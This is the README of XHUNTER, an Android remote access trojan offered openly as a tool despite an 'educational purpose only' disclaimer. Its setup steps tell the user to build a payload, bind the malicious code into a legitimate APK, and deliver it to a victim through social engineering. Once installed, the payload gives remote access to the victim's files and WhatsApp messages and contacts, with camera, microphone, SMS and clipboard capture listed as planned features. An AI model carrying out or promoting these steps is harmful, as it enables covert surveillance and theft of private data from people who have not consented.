<div id="top"></div>

<!-- PROJECT SHIELDS -->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![Last Commit][last-commit-shield]][last-commit-url]
[![Repo Size][repo-size-shield]][repo-size-url]



<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/anirudhmalik/xhunter">
    <img src="images/logo.png" alt="Logo" width="300" height="300">
  </a>

  <h3 align="center">XHUNTER</h3>

  <p align="center">
    Android Penetration Tool [ RAT for Android ] 💀
    <br />
    <br />
    <br />
    <a href="https://github.com/anirudhmalik/release">View Release</a>
    ·
    <a href="https://github.com/anirudhmalik/xhunter/issues">Report Bug</a>
    ·
    <a href="https://github.com/anirudhmalik/xhunter/issues">Request Feature</a>
  </p>
</div>


## ⚖️ Legal Disclaimer: **For Educational Purpose Only**
Usage of **XHUNTER** for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Use Responsibly!



<!-- ABOUT THE PROJECT -->
## About The Project

There are many great **Android RAT** available on GitHub; however, I didn't find one that really suited my needs so I created this enhanced one. I want to create a RAT so amazing that it'll be the last one you ever need -- I think this is it.

Here's why:
* The main reason, I did started on this project is to simplify the problem of **connection** between attacker and victim.[Eliminated all port forwarding and over the internet issues]
* Followed by, I wanted to have control over victims using smartphone📱 with a simple UI app rather then a pc💻 or remote virtual machine🖥 with command line interface. 

Of course, no one will serve all features since your needs may be different. So I'll be adding more in the near future. You may also suggest changes by forking this repo and creating a pull request or opening an issue.😀


<p align="right">(<a href="#top">back to top</a>)</p>


<!-- GETTING STARTED -->
## Getting Started

### Prerequisites

Before we proceed one must have:

* Android Device 
* Good Internet Connection 

### Installation and Usage

In order to use tool we must :

1. Download the latest version **xhunter_vX.X.apk** from release section: [here](https://github.com/anirudhmalik/xhunter/releases)
2. Once downloaded, Install/Open the app in your device. If you face Unknown Source error [see](https://www.maketecheasier.com/install-apps-from-unknown-sources-android) 

3. Once installed, Open app and select **Build Payloads** option and select any desired option to build payload :
  - Build WhatsApp Payload (`use this option/payload to enable whatsapp message feature`)
  - Build + Bind Payload (`use this option/payload to bind xhunter malicious code with legitimate apk`)

4. Send the payload to the victim (`use social engineering or other method`)

5. Once victim uses the payload you will get a active session of victim device to your device

In order to connect/listen to your victim you must :

6. Select **Start Listening** option to listen for the active connection

7. Once started listening you can select active victim device from device list and can access all the listed features <a href="#features">below</a>



<p align="right">(<a href="#top">back to top</a>)</p>

## Features

- ✅ Real time
- ✅ receive any file or folder from target device
- ✅ bind with other apps
- ✅ fetch all whatsapp messages
- ✅ fetch all whatsapp contacts
- ⏳ receive all target message
- ⏳ send sms with target device to any number
- ⏳ recive all target contacts
- ⏳ receive list of all installedd apps in target device
- ⏳ delete any file or folder from target device
- ⏳ capture main and front camera
- ⏳ capture microphone
- ⏳ receive last clipboard text


<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE.md` for more information.

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/anirudhmalik/xhunter.svg?style=for-the-badge
[contributors-url]: https://github.com/anirudhmalik/xhunter/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/anirudhmalik/xhunter.svg?style=for-the-badge
[forks-url]: https://github.com/anirudhmalik/xhunter/network/members
[stars-shield]: https://img.shields.io/github/stars/anirudhmalik/xhunter.svg?style=for-the-badge
[stars-url]: https://github.com/anirudhmalik/xhunter/stargazers
[issues-shield]: https://img.shields.io/github/issues/anirudhmalik/xhunter.svg?style=for-the-badge
[issues-url]: https://github.com/anirudhmalik/xhunter/issues
[license-shield]: https://img.shields.io/github/license/anirudhmalik/xhunter.svg?style=for-the-badge
[license-url]: https://github.com/anirudhmalik/xhunter/blob/master/LICENSE.md
[last-commit-shield]: https://img.shields.io/github/last-commit/anirudhmalik/xhunter.svg?style=for-the-badge
[last-commit-url]: https://github.com/anirudhmalik/xhunter/commits/master
[repo-size-shield]: https://img.shields.io/github/repo-size/anirudhmalik/xhunter.svg?style=for-the-badge
[repo-size-url]: https://github.com/anirudhmalik/xhunter/releases
